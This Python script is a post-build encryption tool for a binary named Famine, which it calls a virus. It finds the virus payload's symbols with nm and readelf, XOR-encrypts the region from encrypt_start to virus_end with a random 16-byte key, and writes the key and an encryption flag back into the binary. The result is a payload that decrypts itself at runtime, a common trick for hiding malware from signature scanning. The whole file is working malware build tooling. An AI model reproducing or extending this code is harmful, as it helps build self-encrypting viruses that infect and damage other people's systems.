#!/usr/bin/env python3
"""
Post-build encryption tool for Famine binary.
Encrypts the virus payload section using XOR encryption.
"""

import sys
import os
import struct
import subprocess
from pathlib import Path

KEY_SIZE = 16  # Must match KEY_SIZE in assembly


def get_symbol_offset(binary_path, symbol_name):
    """Get the file offset of a symbol using nm."""
    try:
        result = subprocess.run(
            ['nm', binary_path],
            capture_output=True,
            text=True,
            check=True
        )
        for line in result.stdout.splitlines():
            parts = line.split()
            if len(parts) >= 3 and parts[2] == symbol_name:
                # nm shows virtual address, we need file offset
                # For simple binaries, we can use readelf to get offset
                addr = int(parts[0], 16)
                return get_file_offset_from_vaddr(binary_path, addr)
        raise ValueError(f"Symbol {symbol_name} not found")
    except subprocess.CalledProcessError as e:
        raise RuntimeError(f"Failed to run nm: {e}")


def get_file_offset_from_vaddr(binary_path, vaddr):
    """Convert virtual address to file offset using readelf."""
    try:
        result = subprocess.run(
            ['readelf', '-l', binary_path],
            capture_output=True,
            text=True,
            check=True
        )
        
        # Parse program headers to find the right segment
        lines = result.stdout.splitlines()
        i = 0
        while i < len(lines):
            line = lines[i]
            if 'LOAD' in line:
                # LOAD header spans two lines
                # Line 1: Type Offset VirtAddr PhysAddr
                # Line 2: FileSiz MemSiz Flags Align
                parts1 = line.split()
                if i + 1 < len(lines):
                    parts2 = lines[i + 1].split()
                    try:
                        offset = int(parts1[1], 16)
                        virtaddr = int(parts1[2], 16)
                        filesz = int(parts2[0], 16)
                        
                        # Check if vaddr falls within this segment
                        if virtaddr <= vaddr < virtaddr + filesz:
                            return offset + (vaddr - virtaddr)
                    except (ValueError, IndexError):
                        pass
            i += 1
        
        raise ValueError(f"Could not find file offset for vaddr 0x{vaddr:x}")
    except subprocess.CalledProcessError as e:
        raise RuntimeError(f"Failed to run readelf: {e}")


def generate_random_key():
    """Generate a random KEY_SIZE-byte encryption key."""
    return os.urandom(KEY_SIZE)


def xor_encrypt(data, key):
    """XOR encrypt data with key (key repeats)."""
    result = bytearray(len(data))
    for i in range(len(data)):
        result[i] = data[i] ^ key[i % len(key)]
    return bytes(result)


def encrypt_famine_binary(binary_path):
    """Encrypt the Famine binary's virus payload."""
    print(f"[*] Encrypting {binary_path}...")
    
    # Get symbol offsets
    print("[*] Locating symbols...")
    virus_start_offset = get_symbol_offset(binary_path, 'virus_start')
    encrypt_start_offset = get_symbol_offset(binary_path, 'encrypt_start')
    virus_end_offset = get_symbol_offset(binary_path, 'virus_end')
    encryption_flag_offset = get_symbol_offset(binary_path, 'encryption_flag')
    encryption_key_storage_offset = get_symbol_offset(binary_path, 'encryption_key_storage')
    
    print(f"    virus_start offset: 0x{virus_start_offset:x}")
    print(f"    encrypt_start offset: 0x{encrypt_start_offset:x}")
    print(f"    virus_end offset: 0x{virus_end_offset:x}")
    print(f"    encryption_flag offset: 0x{encryption_flag_offset:x}")
    print(f"    encryption_key_storage offset: 0x{encryption_key_storage_offset:x}")
    
    # Read the binary
    with open(binary_path, 'rb') as f:
        binary_data = bytearray(f.read())
    
    # Calculate size to encrypt
    encrypt_size = virus_end_offset - encrypt_start_offset
    print(f"[*] Encrypting {encrypt_size} bytes from encrypt_start to virus_end")
    
    # Generate random key
    key = generate_random_key()
    print(f"[*] Generated {KEY_SIZE}-byte encryption key")
    
    # Encrypt the region
    encrypted_region = xor_encrypt(
        binary_data[encrypt_start_offset:virus_end_offset],
        key
    )
    
    # Replace the region with encrypted version
    binary_data[encrypt_start_offset:virus_end_offset] = encrypted_region
    
    # Set encryption_flag to 1 (8-byte little-endian)
    struct.pack_into('<Q', binary_data, encryption_flag_offset, 1)
    print(f"[*] Set encryption_flag to 1")
    
    # Store the key in encryption_key_storage (.data section)
    # encryption_key_storage is already allocated in the binary, just overwrite it
    if encryption_key_storage_offset + KEY_SIZE > len(binary_data):
        raise ValueError(f"encryption_key_storage extends beyond binary (offset: 0x{encryption_key_storage_offset:x}, size: {len(binary_data)})")
    
    # Write key to encryption_key_storage
    binary_data[encryption_key_storage_offset:encryption_key_storage_offset + KEY_SIZE] = key
    print(f"[*] Stored encryption key at encryption_key_storage (offset 0x{encryption_key_storage_offset:x})")
    
    # Write encrypted binary
    with open(binary_path, 'wb') as f:
        f.write(binary_data)
    
    print(f"[+] Successfully encrypted {binary_path}")
    print(f"[+] Binary size: {len(binary_data)} bytes")


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <binary_path>")
        sys.exit(1)
    
    binary_path = sys.argv[1]
    
    if not os.path.exists(binary_path):
        print(f"Error: {binary_path} does not exist")
        sys.exit(1)
    
    try:
        encrypt_famine_binary(binary_path)
    except Exception as e:
        print(f"Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()
